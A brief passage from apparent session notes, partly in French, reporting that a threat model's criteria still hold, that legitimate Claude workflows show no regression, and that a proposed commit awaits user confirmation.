critères 1/2/3 du threat model v1 toujours satisfaits, aucune
régression sur les workflows Claude légitimes. **v2 ferme**.

**Commit** : not committed yet (proposed at end of session, awaiting
user confirmation).
